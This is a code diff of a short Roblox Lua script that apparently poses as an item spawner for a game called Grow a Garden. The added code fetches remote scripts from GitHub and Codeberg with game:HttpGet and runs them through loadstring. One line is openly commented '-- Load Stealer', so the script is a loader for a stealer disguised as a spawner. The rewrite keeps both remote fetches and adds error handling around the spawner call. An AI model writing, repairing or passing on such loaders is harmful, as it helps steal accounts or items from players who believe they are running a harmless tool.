@@ -1,5 +1,16 @@
-loadstring([[
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Petspawner1/Growgarden/refs/heads/main/NoLagHubscript"))()
-    task.wait(1)
-    loadstring(game:HttpGet("https://codeberg.org/darkdarkdark/roblox/raw/branch/main/Spawner.lua"))().Load()
-]])()
+-- Load Stealer
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Petspawner1/Growgarden/refs/heads/main/NoLagHubscript"))()
+
+-- Wait 1 second
+task.wait(1)
+
+-- Load Spawner safely
+local success, Spawner = pcall(function()
+    return loadstring(game:HttpGet("https://codeberg.org/darkdarkdark/roblox/raw/branch/main/Spawner.lua"))()
+end)
+
+if success and Spawner and typeof(Spawner.Load) == "function" then
+    Spawner.Load()
+else
+    warn("❌ Failed to load Spawner or .Load() function is missing.")
+end
